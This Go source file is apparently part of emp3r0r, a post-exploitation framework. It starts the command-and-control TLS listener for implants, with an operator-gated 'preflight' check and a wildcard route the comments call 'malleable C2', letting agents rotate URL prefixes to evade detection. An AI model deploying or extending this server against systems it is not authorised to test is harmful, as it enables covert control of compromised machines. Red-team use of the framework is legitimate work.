package server

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
)

// StartC2AgentTLSServer starts the TLS server.
func StartC2AgentTLSServer() {
	if _, err := os.Stat(live.Temp + transport.WWW); os.IsNotExist(err) {
		err = os.MkdirAll(live.Temp+transport.WWW, 0o700)
		if err != nil {
			logging.Fatalf("StartTLSServer: %v", err)
		}
	}
	r := mux.NewRouter()
	transport.SetCACrtPEM([]byte(live.RuntimeConfig.CAPEM))

	// Preflight Handler
	if live.RuntimeConfig.PreflightEnabled && live.RuntimeConfig.PreflightURL != "" {
		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
		if err == nil {
			logging.Printf("Registering Preflight handler at %s", u.Path)
			r.HandleFunc(u.Path, func(w http.ResponseWriter, req *http.Request) {
				// Read Body
				body, err := io.ReadAll(req.Body)
				if err != nil {
					http.Error(w, "Read error", http.StatusBadRequest)
					return
				}
				// Process
				// Check if there are any active operators
				allowConn := len(OPERATORS) > 0
				respData, err := preflight.ProcessRequest(body, allowConn)

				if err != nil {
					logging.Warningf("Preflight failed: %v", err)
					http.Error(w, "Preflight failed", http.StatusForbidden)
					return
				}

				// Log decision only on success
				if allowConn {
					logging.Infof("Preflight: Allowed connection (Operators active)")
				} else {
					logging.Warningf("Preflight: Rejected connection (No operators)")
				}

				// Write Response
				w.WriteHeader(http.StatusOK)
				w.Write(respData)
			}).Methods(live.RuntimeConfig.PreflightMethod)
		}
	}

	// Allow any prefix to effectively implement "malleable C2"
	// The agent can use any prefix it wants, or rotate them
	r.HandleFunc("/{prefix}/{api}/{token}", apiDispatcher)
	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
	}
	network.EmpTLSServer = &http.Server{
		Addr:    fmt.Sprintf(":%s", live.RuntimeConfig.CCPort),
		Handler: r,
		TLSConfig: &tls.Config{
			CurvePreferences: []tls.CurveID{
				tls.CurveP256,
				tls.X25519,
			},
			MinVersion: tls.VersionTLS12,
		},
	}
	network.EmpTLSServerCtx, network.EmpTLSServerCancel = context.WithCancel(context.Background())
	logging.Successf("🚀 Starting C2 agent listener service with TLS at port %s", live.RuntimeConfig.CCPort)
	err := network.EmpTLSServer.ListenAndServeTLS(transport.ServerCrtFile, transport.ServerKeyFile)
	if err != nil {
		if err == http.ErrServerClosed {
			logging.Warningf("C2 TLS service is shutdown")
			return
		}
		logging.Fatalf("Failed to start HTTPS server at *:%s: %v", live.RuntimeConfig.CCPort, err)
	}
}
